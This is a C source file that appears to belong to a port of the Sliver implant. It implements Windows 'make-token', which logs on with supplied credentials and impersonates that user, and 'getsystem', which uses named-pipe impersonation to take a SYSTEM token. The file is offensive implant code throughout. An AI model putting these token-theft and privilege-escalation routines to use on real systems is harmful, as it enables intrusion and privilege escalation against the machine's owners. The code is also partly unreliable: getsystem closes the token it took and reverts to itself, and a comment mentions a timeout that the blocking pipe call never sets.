/* src/platform/win32/token.c - make-token and getsystem. */
#include "sliver/token.h"

#include "sliver/log.h"

#include <windows.h>

#include <stdio.h>
#include <string.h>

/* LogonUser + ImpersonateLoggedOnUser, same shape as the Go implant. */
int sliver_make_token(const char *username, const char *password, const char *domain,
                      uint32_t logon_type) {
  HANDLE token = NULL;
  BOOL ok;
  DWORD type = logon_type != 0 ? (DWORD)logon_type : LOGON32_LOGON_INTERACTIVE;

  if (username == NULL || username[0] == 0) {
    return -1;
  }
  ok = LogonUserA(username, domain != NULL && domain[0] != 0 ? domain : NULL,
                  password != NULL ? password : "", type, LOGON32_PROVIDER_DEFAULT, &token);
  if (!ok) {
    LOG_DEBUG("token: LogonUser(%s) failed (%lu)", username, (unsigned long)GetLastError());
    return -1;
  }
  ok = ImpersonateLoggedOnUser(token);
  if (!ok) {
    LOG_DEBUG("token: ImpersonateLoggedOnUser failed (%lu)", (unsigned long)GetLastError());
  }
  (void)CloseHandle(token);
  return ok ? 0 : -1;
}

/* Named-pipe impersonation: create a pipe, let SYSTEM connect to it and steal the
 * token. Requires SeImpersonatePrivilege (admin/service context). */
int sliver_get_system(void) {
  char name[128];
  HANDLE pipe;
  HANDLE token = NULL;
  BOOL ok;

  (void)snprintf(name, sizeof(name), "\\\\.\\pipe\\sliver_%lu_%lu",
                 (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
  pipe = CreateNamedPipeA(name, PIPE_ACCESS_DUPLEX,
                          PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, 1, 4096,
                          4096, 0, NULL);
  if (pipe == INVALID_HANDLE_VALUE) {
    LOG_DEBUG("token: CreateNamedPipe failed (%lu)", (unsigned long)GetLastError());
    return -1;
  }
  /* A SYSTEM-level trigger (e.g. a service connecting to the pipe) is required;
   * without one this waits for the timeout and reports failure. */
  ok = ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED;
  if (ok && ImpersonateNamedPipeClient(pipe)) {
    ok = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &token) &&
         RevertToSelf();
    if (token != NULL) {
      (void)CloseHandle(token);
    }
    (void)CloseHandle(pipe);
    return ok ? 0 : -1;
  }
  LOG_DEBUG("token: getsystem failed (%lu)", (unsigned long)GetLastError());
  (void)DisconnectNamedPipe(pipe);
  (void)CloseHandle(pipe);
  return -1;
}
